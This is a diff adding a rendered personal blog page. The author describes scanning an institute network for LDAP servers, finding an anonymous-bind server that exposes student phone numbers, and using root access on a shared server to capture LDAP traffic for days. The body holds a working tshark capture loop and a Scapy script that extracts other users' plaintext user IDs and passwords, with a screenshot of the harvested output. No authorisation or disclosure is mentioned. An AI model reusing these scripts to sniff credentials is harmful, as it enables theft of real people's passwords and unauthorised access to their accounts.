@@ -1,0 +1,583 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests | Gill.Singh.A</title>
+<meta name="keywords" content="cybersecurity, infosec, network, sniffing, tcpdump, tshark, wireshark, ldap">
+<meta name="description" content="In this blog, I’ll share how I retrieved plaintext passwords by intercepting unencrypted LDAP Bind Requests on a remote server where I gained root access.">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><style>
+.gallery {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+  gap: 10px;
+  margin: 1.5em 0;
+}
+.gallery img {
+  width: 100%;
+  border-radius: 6px;
+  cursor: pointer;
+  transition: transform 0.2s ease, box-shadow 0.2s ease;
+  aspect-ratio: auto;
+}
+.gallery img:hover {
+  transform: scale(1.02);
+  box-shadow: 0 4px 20px rgba(0,0,0,0.3);
+}
+.gallery-section {
+  margin: 2em 0 0.5em;
+}
+.gallery-section h2 {
+  margin-bottom: 0.3em;
+}
+.gallery-section h2 a {
+  text-decoration: none;
+  color: var(--primary);
+}
+.gallery-section h2 a:hover {
+  text-decoration: underline;
+}
+
+ 
+.lightbox-overlay {
+  display: none;
+  position: fixed;
+  top: 0; left: 0;
+  width: 100vw; height: 100vh;
+  background: rgba(0, 0, 0, 0.92);
+  z-index: 9999;
+  justify-content: center;
+  align-items: center;
+  cursor: zoom-out;
+}
+.lightbox-overlay.active {
+  display: flex;
+}
+.lightbox-overlay img {
+  max-width: 92vw;
+  max-height: 92vh;
+  object-fit: contain;
+  border-radius: 4px;
+  box-shadow: 0 0 40px rgba(0,0,0,0.5);
+}
+.lightbox-close {
+  position: fixed;
+  top: 16px; right: 24px;
+  color: #fff;
+  font-size: 2rem;
+  cursor: pointer;
+  z-index: 10000;
+  background: none;
+  border: none;
+  font-family: inherit;
+  line-height: 1;
+  opacity: 0.8;
+}
+.lightbox-close:hover { opacity: 1; }
+
+@media (max-width: 600px) {
+  .gallery { grid-template-columns: 1fr; }
+}
+</style>
+<meta property="og:url" content="http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/">
+  <meta property="og:site_name" content="Gill.Singh.A">
+  <meta property="og:title" content="Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests">
+  <meta property="og:description" content="In this blog, I’ll share how I retrieved plaintext passwords by intercepting unencrypted LDAP Bind Requests on a remote server where I gained root access.">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="post">
+    <meta property="article:published_time" content="2024-09-28T07:09:31+05:30">
+    <meta property="article:modified_time" content="2024-09-28T07:09:31+05:30">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Infosec">
+    <meta property="article:tag" content="Network">
+    <meta property="article:tag" content="Sniffing">
+    <meta property="article:tag" content="Tcpdump">
+    <meta property="article:tag" content="Tshark">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests">
+  <meta name="twitter:description" content="In this blog, I’ll share how I retrieved plaintext passwords by intercepting unencrypted LDAP Bind Requests on a remote server where I gained root access.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/post/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests",
+      "item": "http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests",
+  "name": "Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests",
+  "description": "In this blog, I’ll share how I retrieved plaintext passwords by intercepting unencrypted LDAP Bind Requests on a remote server where I gained root access.",
+  "keywords": [
+    "cybersecurity", "infosec", "network", "sniffing", "tcpdump", "tshark", "wireshark", "ldap"
+  ],
+  "articleBody": "LDAP Servers on Network I decided to investigate the LDAP servers within my institute’s private network, which utilizes Class B private IP addresses.\nI employed Gill-Singh-A/Port-Scanner to scan for LDAP ports (389, 636, 3268, 3269) and discovered 49 devices with at least one of these ports open.\nLDAP Anonymous Bind Following that, I used Gill-Singh-A/LDAP-Anonymous-Bind-Checker to assess LDAP Anonymous Bind support, finding that 32 devices allowed anonymous binding.\nAfter some exploration, I discovered the LDAP server responsible for managing authentication requests for our Computer Center’s credentials.\nThe server was identified by the hostname ldap.cc.iitk.ac.in, supported LDAP Anonymous Bind.\nComputer Center LDAP Server After manually exploring ldap.cc.iitk.ac.in, I discovered that I could retrieve any student’s mobile number using a simple search query.\nHowever, what truly alarmed me was that the server was not utilizing SSL for data transmission over the network. This meant that all Computer Center credentials used for authenticating to services like Web Mail and SSH servers were being transmitted as plaintext, making them easily accessible to anyone intercepting the traffic.\nNetwork Traffic Capture To verify my suspicions, I launched tcpdump on a remote server at our institute where I had root access and where users can SSH in using their Computer Center credentials. I began intercepting the network traffic on that server. Specifically, I filtered for port 389 to capture only LDAP traffic.\n1 sudo /usr/sbin/tcpdump -s 65535 -w network_traffic_capture.pcap 'tcp port 389' After successfully logging into the server using my Computer Center credentials on another terminal, I stopped the network capture and downloaded the pcap file for further analysis.\nNetwork Traffic Analysis After opening the pcap file in Wireshark and conducting some analysis, I was able to find my Computer Center user ID and password in plaintext within an LDAP Bind Request.\nThis confirmed my suspicions: the Computer Center credentials were indeed transmitted as plaintext.\nCapturing using tshark Next, I created a simple bash script that utilized tshark to capture LDAP network traffic on the server and save it into a pcap file. The script processes the pcap file once it reaches 100 MB, filtering to include only LDAP Bind Requests and storing the results in my NFS (Network File System) Directory.\n1 2 3 4 5 6 7 8 9 10 11 #! /bin/bash index=0 while true; do /usr/sbin/tshark -w webhome.pcap -i 1 -f \"tcp port 389\" -a filesize:100000 /usr/sbin/tshark -r webhome.pcap -R \"frame contains \\\"ou=People,dc=iitk,dc=ac,dc=in\\\" and ldap.bindRequest\" -w webhome_filtered_${index}.pcap chmod 600 webhome_filtered_${index}.pcap rm -f webhome.pcap ((index++)) done Extracting Passwords from Capture File After collecting LDAP Bind Requests for some days, I downloaded the processed capture file and created a simple Python script using Scapy to extract the user IDs and their corresponding passwords. This allowed me to determine how many credentials I had successfully retrieved.\n1 2 3 4 5 6 7 8 9 10 11 #! /usr/bin/env python3 from sys import argv from scapy.all import rdpcap, LDAP_BindRequest, TCP, LDAP from colorama import Fore packets = rdpcap(argv[1]) # argv[1] Network Capture File (.pcap) for pkt in packets: if LDAP_BindRequest in pkt and pkt[TCP][LDAP][LDAP_BindRequest].authentication.val != b'': print(f\"{Fore.CYAN}{pkt[TCP][LDAP][LDAP_BindRequest].bind_name.val.decode().split(',')[0].split('=')[1]}\\t{Fore.RESET}=\u003e\\t{Fore.GREEN}{pkt[TCP][LDAP][LDAP_BindRequest].authentication.val.decode()}{Fore.RESET}\") The following was the output\nConclusion This investigation revealed significant security concerns regarding the transmission of sensitive data over unencrypted connections. It’s crucial to implement proper security measures to protect user information in our digital landscape.\nAs we navigate our digital landscape, it’s essential to ensure that proper security measures are in place to protect user information.\n",
+  "wordCount" : "568",
+  "inLanguage": "en",
+  "datePublished": "2024-09-28T07:09:31+05:30",
+  "dateModified": "2024-09-28T07:09:31+05:30",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Gill.Singh.A",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.jpg"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="Gill.Singh.A (Alt + H)">Gill.Singh.A</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/post/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/field-guide/" title="Field Guide">
+                    <span>Field Guide</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/gallery/" title="Photography">
+                    <span>Photography</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <nav class="breadcrumbs" role="navigation" aria-label="Breadcrumb">
+            <a href="/">Home</a>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+                <polyline points="9 18 15 12 9 6"></polyline>
+            </svg>
+            <a href="/post/">Posts</a>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right">
+        <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+</nav>
+    <h1 class="post-title entry-hint-parent">
+      Extracting Passwords in Plaintext by Sniffing LDAP Bind Requests
+      <span class="entry-hint" title="Draft">
+        <svg xmlns="http://www.w3.org/2000/svg" height="35" viewBox="0 -960 960 960" fill="currentColor">
+          <path
+            d="M160-410v-60h300v60H160Zm0-165v-60h470v60H160Zm0-165v-60h470v60H160Zm360 580v-123l221-220q9-9 20-13t22-4q12 0 23 4.5t20 13.5l37 37q9 9 13 20t4 22q0 11-4.5 22.5T862.09-380L643-160H520Zm300-263-37-37 37 37ZM580-220h38l121-122-18-19-19-18-122 121v38Zm141-141-19-18 37 37-18-19Z" />
+        </svg>
+      </span>
+    </h1>
+    <div class="post-description">
+      In this blog, I’ll share how I retrieved plaintext passwords by intercepting unencrypted LDAP Bind Requests on a remote server where I gained root access.
+    </div>
+    <div class="post-meta">
+
+<span title='2024-09-28 07:09:31 +0530 IST'>September 28, 2024</span>&nbsp;·&nbsp;<span>3 min</span>
+
+</div>
+  </header> <details class="toc" >
+    <summary accesskey="c" title="(Alt + C)">
+        <span class="title">Table of Contents</span>
+    </summary>
+
+    <div class="inner"><ul>
+            <li>
+                <a href="#ldap-servers-on-network" aria-label="LDAP Servers on Network">LDAP Servers on Network</a></li>
+            <li>
+                <a href="#ldap-anonymous-bind" aria-label="LDAP Anonymous Bind">LDAP Anonymous Bind</a></li>
+            <li>
+                <a href="#computer-center-ldap-server" aria-label="Computer Center LDAP Server">Computer Center LDAP Server</a></li>
+            <li>
+                <a href="#network-traffic-capture" aria-label="Network Traffic Capture">Network Traffic Capture</a></li>
+            <li>
+                <a href="#network-traffic-analysis" aria-label="Network Traffic Analysis">Network Traffic Analysis</a></li>
+            <li>
+                <a href="#capturing-using-tshark" aria-label="Capturing using tshark">Capturing using tshark</a></li>
+            <li>
+                <a href="#extracting-passwords-from-capture-file" aria-label="Extracting Passwords from Capture File">Extracting Passwords from Capture File</a></li>
+            <li>
+                <a href="#conclusion" aria-label="Conclusion">Conclusion</a>
+            </li>
+        </ul>
+    </div>
+</details>
+
+  <div class="post-content md-content"><h2 id="ldap-servers-on-network">LDAP Servers on Network<a hidden class="anchor" aria-hidden="true" href="#ldap-servers-on-network">#</a></h2>
+<p>I decided to investigate the LDAP servers within my institute&rsquo;s private network, which utilizes Class B private IP addresses.<br />
+I employed <a href="https://github.com/Gill-Singh-A/Port-Scanner">Gill-Singh-A/Port-Scanner</a> to scan for LDAP ports (389, 636, 3268, 3269) and discovered 49 devices with at least one of these ports open.<br />
+<img alt="LDAP Port Scan" loading="lazy" src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/port_scan.png"></p>
+<h2 id="ldap-anonymous-bind">LDAP Anonymous Bind<a hidden class="anchor" aria-hidden="true" href="#ldap-anonymous-bind">#</a></h2>
+<p>Following that, I used <a href="https://github.com/Gill-Singh-A/LDAP-Anonymous-Bind-Checker">Gill-Singh-A/LDAP-Anonymous-Bind-Checker</a> to assess LDAP Anonymous Bind support, finding that 32 devices allowed anonymous binding.<br />
+<img alt="LDAP Anonymous Bind Check" loading="lazy" src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_anonymous_bind_check.png"><br />
+After some exploration, I discovered the LDAP server responsible for managing authentication requests for our Computer Center’s credentials.<br />
+The server was identified by the hostname <strong>ldap.cc.iitk.ac.in</strong>, supported LDAP Anonymous Bind.</p>
+<h2 id="computer-center-ldap-server">Computer Center LDAP Server<a hidden class="anchor" aria-hidden="true" href="#computer-center-ldap-server">#</a></h2>
+<p>After manually exploring <strong>ldap.cc.iitk.ac.in</strong>, I discovered that I could retrieve any student’s mobile number using a simple search query.<br />
+<img alt="CC LDAP Student Information" loading="lazy" src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/cc_ldap_student_info.png"><br />
+However, what truly alarmed me was that the server was not utilizing SSL for data transmission over the network. This meant that all Computer Center credentials used for authenticating to services like Web Mail and SSH servers were being transmitted as plaintext, making them easily accessible to anyone intercepting the traffic.<br />
+<img alt="LDAP Authentication" loading="lazy" src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/ldap_authentication.png"></p>
+<h2 id="network-traffic-capture">Network Traffic Capture<a hidden class="anchor" aria-hidden="true" href="#network-traffic-capture">#</a></h2>
+<p>To verify my suspicions, I launched <strong>tcpdump</strong> on a remote server at our institute where I had root access and where users can SSH in using their Computer Center credentials. I began intercepting the network traffic on that server. Specifically, I filtered for port 389 to capture only LDAP traffic.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/sbin/tcpdump -s <span class="m">65535</span> -w network_traffic_capture.pcap <span class="s1">&#39;tcp port 389&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After successfully logging into the server using my Computer Center credentials on another terminal, I stopped the network capture and downloaded the pcap file for further analysis.</p>
+<h2 id="network-traffic-analysis">Network Traffic Analysis<a hidden class="anchor" aria-hidden="true" href="#network-traffic-analysis">#</a></h2>
+<p>After opening the pcap file in <strong>Wireshark</strong> and conducting some analysis, I was able to find my Computer Center user ID and password in plaintext within an LDAP Bind Request.<br />
+<img alt="Network Traffic Analysis" loading="lazy" src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/network_traffic_analysis.png"><br />
+This confirmed my suspicions: the Computer Center credentials were indeed transmitted as plaintext.</p>
+<h2 id="capturing-using-tshark">Capturing using tshark<a hidden class="anchor" aria-hidden="true" href="#capturing-using-tshark">#</a></h2>
+<p>Next, I created a simple bash script that utilized <strong>tshark</strong> to capture LDAP network traffic on the server and save it into a pcap file. The script processes the pcap file once it reaches 100 MB, filtering to include only LDAP Bind Requests and storing the results in my NFS (Network File System) Directory.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#! /bin/bash
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">index</span><span class="o">=</span><span class="m">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">	/usr/sbin/tshark -w webhome.pcap -i <span class="m">1</span> -f <span class="s2">&#34;tcp port 389&#34;</span> -a filesize:100000
+</span></span><span class="line"><span class="cl">	/usr/sbin/tshark -r webhome.pcap -R <span class="s2">&#34;frame contains \&#34;ou=People,dc=iitk,dc=ac,dc=in\&#34; and ldap.bindRequest&#34;</span> -w webhome_filtered_<span class="si">${</span><span class="nv">index</span><span class="si">}</span>.pcap
+</span></span><span class="line"><span class="cl">	chmod <span class="m">600</span> webhome_filtered_<span class="si">${</span><span class="nv">index</span><span class="si">}</span>.pcap
+</span></span><span class="line"><span class="cl">	rm -f webhome.pcap
+</span></span><span class="line"><span class="cl">	<span class="o">((</span>index++<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="extracting-passwords-from-capture-file">Extracting Passwords from Capture File<a hidden class="anchor" aria-hidden="true" href="#extracting-passwords-from-capture-file">#</a></h2>
+<p>After collecting LDAP Bind Requests for some days, I downloaded the processed capture file and created a simple Python script using <a href="https://scapy.net/">Scapy</a> to extract the user IDs and their corresponding passwords. This allowed me to determine how many credentials I had successfully retrieved.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#! /usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">scapy.all</span> <span class="kn">import</span> <span class="n">rdpcap</span><span class="p">,</span> <span class="n">LDAP_BindRequest</span><span class="p">,</span> <span class="n">TCP</span><span class="p">,</span> <span class="n">LDAP</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">Fore</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">packets</span> <span class="o">=</span> <span class="n">rdpcap</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>              <span class="c1"># argv[1] Network Capture File (.pcap)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">pkt</span> <span class="ow">in</span> <span class="n">packets</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">LDAP_BindRequest</span> <span class="ow">in</span> <span class="n">pkt</span> <span class="ow">and</span> <span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">][</span><span class="n">LDAP</span><span class="p">][</span><span class="n">LDAP_BindRequest</span><span class="p">]</span><span class="o">.</span><span class="n">authentication</span><span class="o">.</span><span class="n">val</span> <span class="o">!=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">CYAN</span><span class="si">}{</span><span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">][</span><span class="n">LDAP</span><span class="p">][</span><span class="n">LDAP_BindRequest</span><span class="p">]</span><span class="o">.</span><span class="n">bind_name</span><span class="o">.</span><span class="n">val</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;=&#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="se">\t</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RESET</span><span class="si">}</span><span class="s2">=&gt;</span><span class="se">\t</span><span class="si">{</span><span class="n">Fore</span><span class="o">.</span><span class="n">GREEN</span><span class="si">}{</span><span class="n">pkt</span><span class="p">[</span><span class="n">TCP</span><span class="p">][</span><span class="n">LDAP</span><span class="p">][</span><span class="n">LDAP_BindRequest</span><span class="p">]</span><span class="o">.</span><span class="n">authentication</span><span class="o">.</span><span class="n">val</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}{</span><span class="n">Fore</span><span class="o">.</span><span class="n">RESET</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The following was the output<br />
+<img alt="Extraced Passwords" loading="lazy" src="/p/extracting-passwords-in-plaintext-by-sniffing-ldap-bind-requests/assets/images/passwords_extracted.png"><br /></p>
+<h2 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h2>
+<p>This investigation revealed significant security concerns regarding the transmission of sensitive data over unencrypted connections. It&rsquo;s crucial to implement proper security measures to protect user information in our digital landscape.<br />
+As we navigate our digital landscape, it’s essential to ensure that proper security measures are in place to protect user information.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/cybersecurity/">Cybersecurity</a></li>
+      <li><a href="http://localhost:1313/tags/infosec/">Infosec</a></li>
+      <li><a href="http://localhost:1313/tags/network/">Network</a></li>
+      <li><a href="http://localhost:1313/tags/sniffing/">Sniffing</a></li>
+      <li><a href="http://localhost:1313/tags/tcpdump/">Tcpdump</a></li>
+      <li><a href="http://localhost:1313/tags/tshark/">Tshark</a></li>
+      <li><a href="http://localhost:1313/tags/wireshark/">Wireshark</a></li>
+      <li><a href="http://localhost:1313/tags/ldap/">Ldap</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/p/lateral-movement-through-ssh-command-tampering/">
+    <span class="title">« Prev</span>
+    <span>Lateral Movement Through SSH Command Tampering</span>
+  </a>
+  <a class="next" href="http://localhost:1313/p/building-a-heat-map-for-iit-kanpurs-computer-labs/">
+    <span class="title">Next »</span>
+    <span>Building a Heat Map for IIT Kanpur&#39;s Computer Labs</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">Gill.Singh.A</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a><div class="lightbox-overlay" id="lightbox">
+  <button class="lightbox-close" aria-label="Close">&times;</button>
+  <img src="" alt="" />
+</div>
+<script>
+(function() {
+  const overlay = document.getElementById('lightbox');
+  if (!overlay) return;
+  const lbImg = overlay.querySelector('img');
+  const closeBtn = overlay.querySelector('.lightbox-close');
+
+  document.querySelectorAll('.gallery img').forEach(function(img) {
+    img.addEventListener('click', function() {
+      lbImg.src = this.src;
+      lbImg.alt = this.alt;
+      overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    });
+  });
+
+  function closeLightbox() {
+    overlay.classList.remove('active');
+    document.body.style.overflow = '';
+    lbImg.src = '';
+  }
+
+  overlay.addEventListener('click', function(e) {
+    if (e.target !== lbImg) closeLightbox();
+  });
+  closeBtn.addEventListener('click', closeLightbox);
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closeLightbox();
+  });
+})();
+</script>
+
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
